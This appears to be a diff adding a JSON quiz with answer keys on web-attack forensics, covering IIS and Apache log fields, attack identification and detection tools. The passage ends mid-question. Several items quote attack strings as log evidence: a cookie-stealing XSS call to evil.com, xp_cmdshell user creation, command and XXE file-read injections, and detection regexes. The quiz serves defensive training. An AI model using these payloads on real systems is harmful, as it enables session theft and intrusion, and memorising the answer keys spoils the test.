@@ -1,0 +1,2102 @@
+[
+  {
+    "question": "During a web application forensic investigation, you discover that an attacker exploited a vulnerability allowing them to execute arbitrary SQL commands. The IIS logs show requests containing 'UNION SELECT' statements. Which type of SQL injection technique was most likely used?",
+    "options": [
+      {
+        "value": "Blind SQL injection",
+        "isCorrect": false
+      },
+      {
+        "value": "Union-based SQL injection",
+        "isCorrect": true
+      },
+      {
+        "value": "Time-based SQL injection",
+        "isCorrect": false
+      },
+      {
+        "value": "Error-based SQL injection",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "An investigator analyzing Apache access logs notices the following entry: '192.168.1.50 - - [15/Mar/2024:14:23:45 +0000] \"GET /search.php?q=<script>document.location='http://evil.com/steal.php?c='+document.cookie</script> HTTP/1.1\" 200 4523'. What type of attack does this log entry indicate?",
+    "options": [
+      {
+        "value": "SQL Injection attack",
+        "isCorrect": false
+      },
+      {
+        "value": "Cross-Site Scripting (XSS) attack",
+        "isCorrect": true
+      },
+      {
+        "value": "Cross-Site Request Forgery (CSRF) attack",
+        "isCorrect": false
+      },
+      {
+        "value": "XML External Entity (XXE) attack",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which field in an IIS log file contains the actual HTTP request made by the client, including any malicious payloads?",
+    "options": [
+      {
+        "value": "cs-uri-stem",
+        "isCorrect": false
+      },
+      {
+        "value": "cs-uri-query",
+        "isCorrect": true
+      },
+      {
+        "value": "cs-host",
+        "isCorrect": false
+      },
+      {
+        "value": "sc-status",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "A forensic analyst is investigating a suspected web shell upload. Which of the following Apache log entries would be MOST indicative of a successful web shell execution?",
+    "options": [
+      {
+        "value": "GET /uploads/image.jpg HTTP/1.1 200",
+        "isCorrect": false
+      },
+      {
+        "value": "POST /uploads/shell.php?cmd=whoami HTTP/1.1 200",
+        "isCorrect": true
+      },
+      {
+        "value": "GET /admin/login.php HTTP/1.1 401",
+        "isCorrect": false
+      },
+      {
+        "value": "GET /index.html HTTP/1.1 304",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During a web attack investigation, you need to correlate events across multiple log sources. Which timestamp format is used by default in Apache access logs?",
+    "options": [
+      {
+        "value": "ISO 8601 format (YYYY-MM-DDTHH:MM:SS)",
+        "isCorrect": false
+      },
+      {
+        "value": "Common Log Format (DD/Mon/YYYY:HH:MM:SS +ZZZZ)",
+        "isCorrect": true
+      },
+      {
+        "value": "Unix epoch timestamp",
+        "isCorrect": false
+      },
+      {
+        "value": "Windows FILETIME format",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "An attacker has successfully exploited a Local File Inclusion (LFI) vulnerability. Which of the following log entries would BEST indicate this attack vector?",
+    "options": [
+      {
+        "value": "GET /page.php?file=../../../etc/passwd HTTP/1.1 200",
+        "isCorrect": true
+      },
+      {
+        "value": "GET /page.php?id=1 OR 1=1 HTTP/1.1 200",
+        "isCorrect": false
+      },
+      {
+        "value": "POST /upload.php HTTP/1.1 200",
+        "isCorrect": false
+      },
+      {
+        "value": "GET /admin/?user=admin HTTP/1.1 302",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "According to OWASP Top 10 2021, which vulnerability category replaced 'XML External Entities (XXE)' and now includes XXE as a subset?",
+    "options": [
+      {
+        "value": "A01:2021 - Broken Access Control",
+        "isCorrect": false
+      },
+      {
+        "value": "A03:2021 - Injection",
+        "isCorrect": false
+      },
+      {
+        "value": "A05:2021 - Security Misconfiguration",
+        "isCorrect": true
+      },
+      {
+        "value": "A08:2021 - Software and Data Integrity Failures",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "While investigating a web server compromise, you find that the attacker used a technique to bypass input validation by encoding characters. The log shows '%27%20OR%20%271%27=%271'. What encoding scheme was used?",
+    "options": [
+      {
+        "value": "Base64 encoding",
+        "isCorrect": false
+      },
+      {
+        "value": "URL encoding (percent encoding)",
+        "isCorrect": true
+      },
+      {
+        "value": "HTML entity encoding",
+        "isCorrect": false
+      },
+      {
+        "value": "Unicode encoding",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In IIS logs, what does an HTTP status code of 500 typically indicate during a forensic investigation of SQL injection attempts?",
+    "options": [
+      {
+        "value": "The SQL injection was blocked by a WAF",
+        "isCorrect": false
+      },
+      {
+        "value": "The attacker's request was malformed and rejected",
+        "isCorrect": false
+      },
+      {
+        "value": "The SQL injection may have caused an unhandled database error",
+        "isCorrect": true
+      },
+      {
+        "value": "The user session was terminated successfully",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "A forensic investigator is analyzing a potential Server-Side Request Forgery (SSRF) attack. Which log entry would be the strongest indicator of this attack type?",
+    "options": [
+      {
+        "value": "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1 200",
+        "isCorrect": true
+      },
+      {
+        "value": "GET /login?redirect=http://evil.com HTTP/1.1 302",
+        "isCorrect": false
+      },
+      {
+        "value": "POST /search?q=<script>alert(1)</script> HTTP/1.1 200",
+        "isCorrect": false
+      },
+      {
+        "value": "GET /admin/../../../etc/shadow HTTP/1.1 403",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When analyzing web server logs for a brute force attack investigation, which pattern would be the MOST reliable indicator?",
+    "options": [
+      {
+        "value": "Multiple requests to /robots.txt from the same IP",
+        "isCorrect": false
+      },
+      {
+        "value": "High volume of POST requests to /login with varying response sizes and multiple 401/403 responses",
+        "isCorrect": true
+      },
+      {
+        "value": "Sequential GET requests to multiple pages from the same IP",
+        "isCorrect": false
+      },
+      {
+        "value": "Single POST request with a large payload size",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During a web application forensic investigation, you notice the IIS log field 'cs(User-Agent)' contains 'sqlmap/1.5.2'. What does this finding suggest?",
+    "options": [
+      {
+        "value": "The server has been configured with SQL monitoring tools",
+        "isCorrect": false
+      },
+      {
+        "value": "An automated SQL injection testing tool was used against the application",
+        "isCorrect": true
+      },
+      {
+        "value": "The database server is running version 1.5.2 of SQL Server",
+        "isCorrect": false
+      },
+      {
+        "value": "A legitimate database administrator was performing maintenance",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which of the following indicators in Apache error logs would suggest a potential Remote Code Execution (RCE) attack through command injection?",
+    "options": [
+      {
+        "value": "File does not exist: /var/www/html/admin",
+        "isCorrect": false
+      },
+      {
+        "value": "sh: 1: id: command not found or 'uid=33(www-data) gid=33(www-data)'",
+        "isCorrect": true
+      },
+      {
+        "value": "PHP Parse error: syntax error, unexpected '}'",
+        "isCorrect": false
+      },
+      {
+        "value": "ModSecurity: Access denied with code 403",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "You are investigating a suspected web defacement incident. The web server is running Apache on Linux. Which log file should you examine FIRST to identify how the attacker gained initial access?",
+    "options": [
+      {
+        "value": "/var/log/apache2/error.log",
+        "isCorrect": false
+      },
+      {
+        "value": "/var/log/apache2/access.log",
+        "isCorrect": true
+      },
+      {
+        "value": "/var/log/syslog",
+        "isCorrect": false
+      },
+      {
+        "value": "/var/log/auth.log",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "An investigator found the following string in decoded web logs: '; EXEC xp_cmdshell('net user hacker P@ss123 /add')--'. What is the attacker attempting to accomplish?",
+    "options": [
+      {
+        "value": "Extracting password hashes from the database",
+        "isCorrect": false
+      },
+      {
+        "value": "Creating a backdoor user account on the Windows server through SQL injection",
+        "isCorrect": true
+      },
+      {
+        "value": "Establishing a reverse shell connection to a remote server",
+        "isCorrect": false
+      },
+      {
+        "value": "Modifying database records to escalate privileges",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: A financial institution detected unusual database queries originating from their web application. The security team found the following entry in the WAF logs: 'GET /account?id=1;WAITFOR DELAY '0:0:10'--'. What type of SQL injection technique is being used?",
+    "options": [
+      {
+        "value": "Union-based SQL injection",
+        "isCorrect": false
+      },
+      {
+        "value": "Error-based SQL injection",
+        "isCorrect": false
+      },
+      {
+        "value": "Time-based blind SQL injection",
+        "isCorrect": true
+      },
+      {
+        "value": "Stacked queries SQL injection",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which tool is specifically designed to analyze IIS HTTP log files and provides filtering capabilities for forensic investigations?",
+    "options": [
+      {
+        "value": "Wireshark",
+        "isCorrect": false
+      },
+      {
+        "value": "HttpLogBrowser",
+        "isCorrect": true
+      },
+      {
+        "value": "Autopsy",
+        "isCorrect": false
+      },
+      {
+        "value": "FTK Imager",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During an investigation, you identify the following pattern in Apache logs: multiple requests within seconds containing '../../', '..\\..\\', and '%2e%2e%2f'. What attack technique is being attempted?",
+    "options": [
+      {
+        "value": "Cross-Site Scripting (XSS)",
+        "isCorrect": false
+      },
+      {
+        "value": "Path/Directory Traversal attack",
+        "isCorrect": true
+      },
+      {
+        "value": "HTTP Response Splitting",
+        "isCorrect": false
+      },
+      {
+        "value": "Session Fixation attack",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the PRIMARY challenge in web application forensics when dealing with HTTPS traffic?",
+    "options": [
+      {
+        "value": "HTTPS traffic cannot be logged by web servers",
+        "isCorrect": false
+      },
+      {
+        "value": "Network-level packet captures are encrypted, requiring server-side logs or SSL/TLS interception",
+        "isCorrect": true
+      },
+      {
+        "value": "HTTPS connections are not compatible with forensic tools",
+        "isCorrect": false
+      },
+      {
+        "value": "HTTPS automatically deletes log entries after 24 hours",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In the context of OWASP Top 10 2021, which category includes vulnerabilities like insecure deserialization?",
+    "options": [
+      {
+        "value": "A01:2021 - Broken Access Control",
+        "isCorrect": false
+      },
+      {
+        "value": "A03:2021 - Injection",
+        "isCorrect": false
+      },
+      {
+        "value": "A08:2021 - Software and Data Integrity Failures",
+        "isCorrect": true
+      },
+      {
+        "value": "A07:2021 - Identification and Authentication Failures",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "An analyst examining Snort alert logs for XSS attacks would look for which signature category?",
+    "options": [
+      {
+        "value": "sql_injection",
+        "isCorrect": false
+      },
+      {
+        "value": "web-client or xss",
+        "isCorrect": true
+      },
+      {
+        "value": "exploit-kit",
+        "isCorrect": false
+      },
+      {
+        "value": "malware-cnc",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which regular expression pattern would be MOST effective for detecting basic SQL injection attempts in web server logs?",
+    "options": [
+      {
+        "value": "/\\.(php|asp|jsp)$/i",
+        "isCorrect": false
+      },
+      {
+        "value": "/(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|OR\\s+1\\s*=\\s*1)/i",
+        "isCorrect": true
+      },
+      {
+        "value": "/<script.*?>.*?</script>/i",
+        "isCorrect": false
+      },
+      {
+        "value": "/\\.\\.\\/|\\.\\.\\\\|%2e%2e/i",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: During a web server forensic investigation, you notice that an attacker accessed /admin/config.php multiple times with different session cookies. The successful access occurred after 847 failed attempts from the same IP. What type of attack was conducted?",
+    "options": [
+      {
+        "value": "SQL Injection attack",
+        "isCorrect": false
+      },
+      {
+        "value": "Session hijacking",
+        "isCorrect": false
+      },
+      {
+        "value": "Brute force attack on session tokens",
+        "isCorrect": true
+      },
+      {
+        "value": "Cross-Site Request Forgery",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What does the Apache log directive '%t' represent in the LogFormat configuration?",
+    "options": [
+      {
+        "value": "Time taken to serve the request",
+        "isCorrect": false
+      },
+      {
+        "value": "The time the request was received",
+        "isCorrect": true
+      },
+      {
+        "value": "The transfer encoding type",
+        "isCorrect": false
+      },
+      {
+        "value": "The target URL path",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In IIS logs, which HTTP method combined with requests to /webdav/ directory could indicate an attempted file upload attack?",
+    "options": [
+      {
+        "value": "GET",
+        "isCorrect": false
+      },
+      {
+        "value": "HEAD",
+        "isCorrect": false
+      },
+      {
+        "value": "PUT or PROPFIND",
+        "isCorrect": true
+      },
+      {
+        "value": "OPTIONS",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "A web attack investigation reveals XML data in POST requests containing '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>'. What type of attack is being attempted?",
+    "options": [
+      {
+        "value": "Cross-Site Scripting (XSS)",
+        "isCorrect": false
+      },
+      {
+        "value": "XML External Entity (XXE) injection",
+        "isCorrect": true
+      },
+      {
+        "value": "LDAP Injection",
+        "isCorrect": false
+      },
+      {
+        "value": "XPath Injection",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which of the following tools can be used for automated analysis of Apache web server logs during a forensic investigation?",
+    "options": [
+      {
+        "value": "EnCase",
+        "isCorrect": false
+      },
+      {
+        "value": "GoAccess, AWStats, or custom Python scripts",
+        "isCorrect": true
+      },
+      {
+        "value": "Volatility",
+        "isCorrect": false
+      },
+      {
+        "value": "Cellebrite UFED",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During investigation of a DOM-based XSS attack, where would evidence of the attack payload typically NOT be found?",
+    "options": [
+      {
+        "value": "Browser history and cache",
+        "isCorrect": false
+      },
+      {
+        "value": "Web server access logs",
+        "isCorrect": true
+      },
+      {
+        "value": "Client-side JavaScript console logs",
+        "isCorrect": false
+      },
+      {
+        "value": "Network packet captures",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the significance of the 'sc-bytes' field in IIS W3C extended log format during forensic analysis?",
+    "options": [
+      {
+        "value": "It shows the client's source bytes sent",
+        "isCorrect": false
+      },
+      {
+        "value": "It indicates the number of bytes sent by the server to the client",
+        "isCorrect": true
+      },
+      {
+        "value": "It represents the status code in bytes",
+        "isCorrect": false
+      },
+      {
+        "value": "It shows the script execution bytes",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: An e-commerce website was compromised and customer credit card data was stolen. Investigation revealed that the attacker injected JavaScript into product review fields. This malicious code was then executed in other users' browsers when viewing reviews. What type of XSS vulnerability was exploited?",
+    "options": [
+      {
+        "value": "Reflected XSS",
+        "isCorrect": false
+      },
+      {
+        "value": "DOM-based XSS",
+        "isCorrect": false
+      },
+      {
+        "value": "Stored (Persistent) XSS",
+        "isCorrect": true
+      },
+      {
+        "value": "Blind XSS",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which Python library is commonly used for parsing and analyzing Apache web server logs programmatically?",
+    "options": [
+      {
+        "value": "numpy",
+        "isCorrect": false
+      },
+      {
+        "value": "apache-log-parser or re (regex)",
+        "isCorrect": true
+      },
+      {
+        "value": "scipy",
+        "isCorrect": false
+      },
+      {
+        "value": "matplotlib",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During an investigation, you find the following entry in a WAF log: 'BLOCK: Rule 942100 - SQL Injection Attack Detected via libinjection'. What does this indicate?",
+    "options": [
+      {
+        "value": "The WAF successfully blocked an SQL injection attempt",
+        "isCorrect": true
+      },
+      {
+        "value": "The SQL injection was successful and data was exfiltrated",
+        "isCorrect": false
+      },
+      {
+        "value": "The WAF detected a false positive",
+        "isCorrect": false
+      },
+      {
+        "value": "The attacker bypassed the WAF successfully",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In the Apache access log combined format, what does the '%{Referer}i' directive capture?",
+    "options": [
+      {
+        "value": "The client's IP address",
+        "isCorrect": false
+      },
+      {
+        "value": "The URL of the page that referred the client to the current page",
+        "isCorrect": true
+      },
+      {
+        "value": "The response status code",
+        "isCorrect": false
+      },
+      {
+        "value": "The size of the response in bytes",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: A forensic investigator analyzing a compromised web server notices requests with payloads like '; ls -la; cat /etc/passwd;'. The attacker was able to view sensitive system files through the web application. What type of vulnerability was exploited?",
+    "options": [
+      {
+        "value": "Local File Inclusion (LFI)",
+        "isCorrect": false
+      },
+      {
+        "value": "Command Injection (OS Command Injection)",
+        "isCorrect": true
+      },
+      {
+        "value": "Server-Side Request Forgery (SSRF)",
+        "isCorrect": false
+      },
+      {
+        "value": "XML External Entity (XXE)",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the DEFAULT location of IIS log files on a Windows Server?",
+    "options": [
+      {
+        "value": "C:\\Windows\\Logs\\IIS",
+        "isCorrect": false
+      },
+      {
+        "value": "C:\\inetpub\\logs\\LogFiles",
+        "isCorrect": true
+      },
+      {
+        "value": "C:\\Program Files\\IIS\\Logs",
+        "isCorrect": false
+      },
+      {
+        "value": "C:\\Windows\\System32\\LogFiles\\W3SVC",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which HTTP response status code in web server logs would indicate that a resource was found but the client is not authorized to access it?",
+    "options": [
+      {
+        "value": "401 Unauthorized",
+        "isCorrect": false
+      },
+      {
+        "value": "403 Forbidden",
+        "isCorrect": true
+      },
+      {
+        "value": "404 Not Found",
+        "isCorrect": false
+      },
+      {
+        "value": "500 Internal Server Error",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "An attacker attempts to inject malicious content through HTTP headers. Which log field would capture the following attack: 'X-Forwarded-For: <script>alert(document.cookie)</script>'?",
+    "options": [
+      {
+        "value": "cs-uri-query",
+        "isCorrect": false
+      },
+      {
+        "value": "cs(X-Forwarded-For) or custom header logging",
+        "isCorrect": true
+      },
+      {
+        "value": "cs-method",
+        "isCorrect": false
+      },
+      {
+        "value": "sc-status",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During a SIEM log analysis for web attacks, which correlation rule would be MOST effective for detecting automated SQL injection attacks?",
+    "options": [
+      {
+        "value": "Alert on any HTTP 500 error",
+        "isCorrect": false
+      },
+      {
+        "value": "Alert on high volume of requests with SQL keywords from single source within short timeframe",
+        "isCorrect": true
+      },
+      {
+        "value": "Alert on any POST request to login page",
+        "isCorrect": false
+      },
+      {
+        "value": "Alert on requests from non-standard browsers",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the PRIMARY purpose of examining the 'cs-uri-stem' field in IIS logs during forensic analysis?",
+    "options": [
+      {
+        "value": "To identify the query string parameters",
+        "isCorrect": false
+      },
+      {
+        "value": "To identify which files or resources were requested",
+        "isCorrect": true
+      },
+      {
+        "value": "To identify the client's user agent",
+        "isCorrect": false
+      },
+      {
+        "value": "To identify the server's response time",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: While investigating a data breach, you discover that the attacker used the following payload: '/download.php?file=....//....//....//etc/passwd'. What technique did the attacker use to bypass basic path traversal filters?",
+    "options": [
+      {
+        "value": "URL encoding",
+        "isCorrect": false
+      },
+      {
+        "value": "Null byte injection",
+        "isCorrect": false
+      },
+      {
+        "value": "Double encoding or nested traversal sequences",
+        "isCorrect": true
+      },
+      {
+        "value": "Unicode normalization",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which IIS log field indicates the Windows authentication username when integrated authentication is configured?",
+    "options": [
+      {
+        "value": "cs-uri-query",
+        "isCorrect": false
+      },
+      {
+        "value": "cs-username",
+        "isCorrect": true
+      },
+      {
+        "value": "cs(Cookie)",
+        "isCorrect": false
+      },
+      {
+        "value": "c-ip",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In Apache error logs, what severity level would a successful exploitation attempt that crashes a child process typically be logged as?",
+    "options": [
+      {
+        "value": "warn",
+        "isCorrect": false
+      },
+      {
+        "value": "notice",
+        "isCorrect": false
+      },
+      {
+        "value": "error or crit",
+        "isCorrect": true
+      },
+      {
+        "value": "debug",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When analyzing web server logs for XXE attacks, which content type in the request headers would be the strongest indicator?",
+    "options": [
+      {
+        "value": "application/x-www-form-urlencoded",
+        "isCorrect": false
+      },
+      {
+        "value": "application/xml or text/xml",
+        "isCorrect": true
+      },
+      {
+        "value": "multipart/form-data",
+        "isCorrect": false
+      },
+      {
+        "value": "application/json",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the forensic significance of the 'time-taken' field in IIS logs when investigating SQL injection attacks?",
+    "options": [
+      {
+        "value": "It has no relevance to SQL injection investigations",
+        "isCorrect": false
+      },
+      {
+        "value": "Unusually long response times may indicate successful time-based blind SQL injection",
+        "isCorrect": true
+      },
+      {
+        "value": "It shows the time zone of the server",
+        "isCorrect": false
+      },
+      {
+        "value": "It indicates the total session duration",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: A penetration test revealed that an attacker could read arbitrary files by exploiting the application's XML parser. The attack payload included '<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">'. What variation of XXE attack is this?",
+    "options": [
+      {
+        "value": "Classic file disclosure XXE",
+        "isCorrect": false
+      },
+      {
+        "value": "XXE with PHP wrapper for base64 encoded output",
+        "isCorrect": true
+      },
+      {
+        "value": "Blind XXE with out-of-band data exfiltration",
+        "isCorrect": false
+      },
+      {
+        "value": "XXE denial of service attack",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which of the following regex patterns would be MOST effective in detecting XSS attacks in web server logs?",
+    "options": [
+      {
+        "value": "/SELECT.*FROM/i",
+        "isCorrect": false
+      },
+      {
+        "value": "/(<script|javascript:|onerror|onload|onclick|alert\\()/i",
+        "isCorrect": true
+      },
+      {
+        "value": "/\\.\\.\\/|\\.\\.\\\\/i",
+        "isCorrect": false
+      },
+      {
+        "value": "/;\\s*(ls|cat|wget|curl)/i",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During a web application forensic investigation, what is the significance of finding multiple HTTP 302 redirects followed by a 200 response in access logs?",
+    "options": [
+      {
+        "value": "It indicates a failed attack attempt",
+        "isCorrect": false
+      },
+      {
+        "value": "It could indicate successful authentication bypass or open redirect exploitation",
+        "isCorrect": true
+      },
+      {
+        "value": "It shows normal user navigation behavior only",
+        "isCorrect": false
+      },
+      {
+        "value": "It indicates server misconfiguration",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: An investigator notices that an attacker sent requests containing '|ping -c 10 attacker.com|' embedded in form fields. What attack technique is this?",
+    "options": [
+      {
+        "value": "SQL Injection with UNION",
+        "isCorrect": false
+      },
+      {
+        "value": "Pipe-based command injection",
+        "isCorrect": true
+      },
+      {
+        "value": "LDAP Injection",
+        "isCorrect": false
+      },
+      {
+        "value": "HTTP Parameter Pollution",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which Apache log format directive would capture the actual request processing time in microseconds?",
+    "options": [
+      {
+        "value": "%T",
+        "isCorrect": false
+      },
+      {
+        "value": "%D",
+        "isCorrect": true
+      },
+      {
+        "value": "%t",
+        "isCorrect": false
+      },
+      {
+        "value": "%r",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When investigating a potential web shell, which combination of characteristics in web server logs would be MOST suspicious?",
+    "options": [
+      {
+        "value": "GET requests to static HTML files with 200 responses",
+        "isCorrect": false
+      },
+      {
+        "value": "POST requests to a single PHP file with command parameters and varying response sizes",
+        "isCorrect": true
+      },
+      {
+        "value": "Multiple requests to CSS and JavaScript files",
+        "isCorrect": false
+      },
+      {
+        "value": "HEAD requests to verify file existence",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In the OWASP Top 10 2021, which category specifically addresses issues like hardcoded credentials and missing security headers?",
+    "options": [
+      {
+        "value": "A01:2021 - Broken Access Control",
+        "isCorrect": false
+      },
+      {
+        "value": "A02:2021 - Cryptographic Failures",
+        "isCorrect": false
+      },
+      {
+        "value": "A05:2021 - Security Misconfiguration",
+        "isCorrect": true
+      },
+      {
+        "value": "A06:2021 - Vulnerable and Outdated Components",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the forensic value of the 'c-ip' field in IIS logs during a distributed attack investigation?",
+    "options": [
+      {
+        "value": "It shows the content IP address of the response",
+        "isCorrect": false
+      },
+      {
+        "value": "It identifies the source IP addresses of attacking clients",
+        "isCorrect": true
+      },
+      {
+        "value": "It indicates the server's cluster IP",
+        "isCorrect": false
+      },
+      {
+        "value": "It represents the CDN IP address",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: A security analyst discovers that login attempts are being made with usernames like 'admin' OR '1'='1'--'. The logs show these attempts resulted in HTTP 200 responses with larger response sizes than normal failed logins. What does this indicate?",
+    "options": [
+      {
+        "value": "The SQL injection attempts failed",
+        "isCorrect": false
+      },
+      {
+        "value": "The SQL injection likely succeeded in bypassing authentication",
+        "isCorrect": true
+      },
+      {
+        "value": "The WAF blocked all malicious requests",
+        "isCorrect": false
+      },
+      {
+        "value": "The application has proper input validation",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which tool is specifically designed for IIS log analysis and supports advanced filtering and searching capabilities?",
+    "options": [
+      {
+        "value": "Splunk Universal Forwarder",
+        "isCorrect": false
+      },
+      {
+        "value": "Log Parser or Log Parser Studio",
+        "isCorrect": true
+      },
+      {
+        "value": "Nmap",
+        "isCorrect": false
+      },
+      {
+        "value": "Metasploit",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During XXE investigation, finding outbound HTTP requests to external domains in firewall logs correlating with XML processing errors suggests what type of XXE attack?",
+    "options": [
+      {
+        "value": "In-band XXE",
+        "isCorrect": false
+      },
+      {
+        "value": "Out-of-band (OOB) XXE data exfiltration",
+        "isCorrect": true
+      },
+      {
+        "value": "Billion laughs DoS attack",
+        "isCorrect": false
+      },
+      {
+        "value": "XSLT injection",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "What is the PRIMARY difference between reflected and stored XSS from a forensic investigation perspective?",
+    "options": [
+      {
+        "value": "Reflected XSS cannot be detected in logs",
+        "isCorrect": false
+      },
+      {
+        "value": "Stored XSS payload persists in the database, while reflected XSS appears only in request logs",
+        "isCorrect": true
+      },
+      {
+        "value": "Stored XSS only affects server-side components",
+        "isCorrect": false
+      },
+      {
+        "value": "Reflected XSS requires administrative privileges",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "In Apache logs, what does a response code of 206 indicate that might be relevant to a forensic investigation?",
+    "options": [
+      {
+        "value": "The request was unauthorized",
+        "isCorrect": false
+      },
+      {
+        "value": "Partial content was served, possibly indicating download resumption or range-based data theft",
+        "isCorrect": true
+      },
+      {
+        "value": "The server encountered an error",
+        "isCorrect": false
+      },
+      {
+        "value": "The resource was moved permanently",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: During an investigation, you find that an attacker used double URL encoding (%2527 instead of %27) in SQL injection attempts. Why would an attacker use this technique?",
+    "options": [
+      {
+        "value": "To make the payload smaller",
+        "isCorrect": false
+      },
+      {
+        "value": "To bypass WAF and input validation that only decodes once",
+        "isCorrect": true
+      },
+      {
+        "value": "To encrypt the payload",
+        "isCorrect": false
+      },
+      {
+        "value": "To improve database performance",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which field in IIS W3C logs would contain evidence of cookie-based attacks or session hijacking attempts?",
+    "options": [
+      {
+        "value": "cs-uri-stem",
+        "isCorrect": false
+      },
+      {
+        "value": "cs(Cookie)",
+        "isCorrect": true
+      },
+      {
+        "value": "cs-method",
+        "isCorrect": false
+      },
+      {
+        "value": "sc-substatus",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "When using Python to analyze Apache logs for SQL injection attacks, which approach would be MOST effective?",
+    "options": [
+      {
+        "value": "Simply count the total number of requests",
+        "isCorrect": false
+      },
+      {
+        "value": "Use regex patterns to search for SQL keywords in the URL and POST data fields",
+        "isCorrect": true
+      },
+      {
+        "value": "Only analyze 404 error responses",
+        "isCorrect": false
+      },
+      {
+        "value": "Focus exclusively on GET requests",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which indicator in web server logs would suggest a web application vulnerability scanner was used against the target?",
+    "options": [
+      {
+        "value": "A single request from one IP address",
+        "isCorrect": false
+      },
+      {
+        "value": "Rapid sequential requests to many different endpoints with common vulnerability payloads",
+        "isCorrect": true
+      },
+      {
+        "value": "Requests only to the homepage",
+        "isCorrect": false
+      },
+      {
+        "value": "Traffic during business hours only",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Case Scenario: An analyst reviewing SIEM alerts notices correlation between web server logs showing SQL injection attempts and database logs showing unusual query patterns. What does this correlation suggest?",
+    "options": [
+      {
+        "value": "The attacks were blocked at the web application layer",
+        "isCorrect": false
+      },
+      {
+        "value": "The SQL injection attempts successfully reached and affected the database",
+        "isCorrect": true
+      },
+      {
+        "value": "The SIEM is generating false positives",
+        "isCorrect": false
+      },
+      {
+        "value": "The database is operating normally",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "Which file would you examine on an Apache server to understand the custom log format configuration?",
+    "options": [
+      {
+        "value": "/var/log/apache2/access.log",
+        "isCorrect": false
+      },
+      {
+        "value": "/etc/apache2/apache2.conf or httpd.conf",
+        "isCorrect": true
+      },
+      {
+        "value": "/etc/apache2/sites-available/default",
+        "isCorrect": false
+      },
+      {
+        "value": "/var/www/html/index.php",
+        "isCorrect": false
+      }
+    ]
+  },
+  {
+    "question": "During an XXE attack investigation, which entity declaration pattern indicates an attempt to exploit Server-Side Request Forgery (SSRF) through XXE?",
+    "options": [
+      {
+        "value": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
